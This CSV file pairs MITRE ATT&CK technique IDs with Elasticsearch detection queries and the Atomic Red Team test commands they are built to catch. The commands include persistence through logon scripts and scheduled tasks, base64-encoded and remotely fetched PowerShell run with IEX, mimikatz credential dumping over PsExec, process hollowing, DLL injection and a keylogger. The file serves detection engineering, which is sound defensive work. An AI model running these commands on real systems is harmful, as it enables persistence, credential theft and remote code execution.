T1037.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                            {""match"":{""CommandLine"": ""Environment""}},                                                           
                            {""match_phrase"":{""CommandLine"": ""REG.exe ADD""}}, 
                             {""wildcard"":{""CommandLine"": ""*.bat""}},                 
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","echo ""echo Art ""Logon Script"" atomic test was successful. 
>> %USERPROFILE%\desktop\T1037.001-log.txt"" 
> %temp%\art.bat && REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d ""%temp%\art.bat"" /f",2,,
T1040,"{
    ""query"": {
        ""bool"": {
            ""must"": [
               
                {""match_phrase"": {""CommandLine"": ""tshark.exe""}},
                 {""match_phrase"": {""CommandLine"": ""Ethernet""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","""c:\Program Files\Wireshark\tshark.exe"" -i Ethernet -c 5",2,,
T1040,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match_phrase"": {""CommandLine"": ""netsh trace start""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",netsh trace start capture=yes tracefile=%temp%\trace.etl maxsize=10,2,,
T1053.002,"{
    ""query"": {
        ""bool"": {
            ""must"": [
               
                {""match"": {""CommandLine"": ""at""}},
                 {""match"": {""CommandLine"": ""interactive""}},
                 {""match"": {""CommandLine"": ""cmd""}},
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",at 13:20 /interactive cmd,2,,
T1053.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                        {""match_phrase"": {""CommandLine"": ""Register-ScheduledTask""}},
                         {""match"": {""CommandLine"": ""Highest""}},
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$Action = New-ScheduledTaskAction -Execute ""calc.exe""; 
$Trigger = New-ScheduledTaskTrigger -AtLogon; 
$User = New-ScheduledTaskPrincipal -GroupId ""BUILTIN\Administrators"" -RunLevel Highest; 
$Set = New-ScheduledTaskSettingsSet; 
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set;
Register-ScheduledTask AtomicTask -InputObject $object",2,,
T1053.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match_phrase"": {""CommandLine"": ""reg add""}},
                  {""match_phrase"": {""CommandLine"": "" schtasks.exe""}},
                {""wildcard"": {""CommandLine"": ""powershell*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f 
&& schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" 
powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st 07:45",2,,
T1053.005,"
{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                  {""wildcard"":{""CommandLine"": ""schtasks*""}}        
                ]
     }
    },
    {""bool"":{
     ""should"":[ 
                {""match"": {""CommandLine"": ""onlogon""}},
                {""match"": {""CommandLine"": ""onstart""}}
                     ]
     }
    }
                 ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","schtasks /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" 
&& schtasks /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""",2,,
T1053.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""wildcard"": {""CommandLine"": ""SCHTASKS*""}},
                {""match"": {""CommandLine"": ""spawn""}},
                {""match"": {""CommandLine"": ""/ST""}},
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10,2,,
T1053.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                                 {""match_phrase"": {""CommandLine"": ""Invoke-MalDoc""}},
                                 {""match_phrase"": {""CommandLine"": ""-macroFile""}},
                                 {""match_phrase"": {""CommandLine"": ""Scheduler""}},


            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) ; 
Invoke-MalDoc -macroFile ""PathToAtomicsFolder\T1053.005\src\T1053.005-macrocode.txt"" -officeProduct ""Word"" -sub ""Scheduler""",,,
T1053.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                                 {""match_phrase"": {""CommandLine"":""Invoke-CimMethod""}},
                                 {""match_phrase"": {""CommandLine"":""Microsoft\\Windows\\TaskScheduler""}},
                                   {""wildcard"": {""CommandLine"":""*.xml""}},
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","$xml = [System.IO.File]::ReadAllText(""PathToAtomicsFolder\T1053.005\src\T1053_005_WMI.xml""); 
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace ""Root\Microsoft\Windows\TaskScheduler"" -MethodName ""RegisterByXml"" -Arguments @{ Force = $true; Xml =$xml; }",2,,
T1055,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""wildcard"": {""CommandLine"": ""PsExec*""}},
                 {""match"": {""CommandLine"": ""inject""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","C:\PSTools\PsExec.exe /accepteula \\DC1 -c %tmp%\mimikatz\x64\mimikatz.exe ""lsadump::lsa /inject /id:500"" ""exit""",2,,
T1055,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match_phrase"": {""CommandLine"": "" Invoke-Maldoc""}},
                   {""match"": {""CommandLine"": ""Execute""}},
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing); 
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt"" -officeProduct ""Word"" -sub ""Execute""",2,,
T1055.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match_phrase"": {""CommandLine"": ""Invoke-WebRequest""}},
                 
                    ]
     }
    },
    {""bool"":{
     ""must"":[
                   {""match"": {""CommandLine"": ""INJECTRUNNING""}},
                {""match"": {""CommandLine"": ""mavinject""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",$mypid =; mavinject $mypid /INJECTRUNNING,与T1056.004混淆,,
T1055.012,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match"": {""CommandLine"": ""-Sponsor""}},
                 {""match"": {""CommandLine"": ""-Hollow""}},
                  {""match"": {""CommandLine"": ""-ParentPID""}},
                {""match_phrase"": {""CommandLine"": ""Start-Hollow""}},
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",". cd6d01_Start-Hollow.ps1;
$ppid=Get-Process explorer | select -expand id; 
Start-Hollow -Sponsor ""C:\Windows\System32\notepad.exe"" -Hollow ""C:\Windows\System32\cmd.exe"" -ParentPID $ppid -Verbose",2,,
T1055.012,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match_phrase"": {""CommandLine"": ""Invoke-MalDoc""}},
                  {""match"": {""CommandLine"": ""Exploit""}},          
                        ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) ; 
Invoke-MalDoc -macroFile ""PathToAtomicsFolder\T1055.012\src\T1055.012-macrocode.txt"" -officeProduct ""Word"" -sub ""Exploit""",2,,
T1056.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                 {""match_phrase"": {""CommandLine"": ""Set-Location""}},
                {""match"": {""CommandLine"": ""-LogPath""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",Set-Location $PathToAtomicsFolder; .\T1056.001\src\Get-Keystrokes.ps1 -LogPath $env:TEMP\key.log,,,
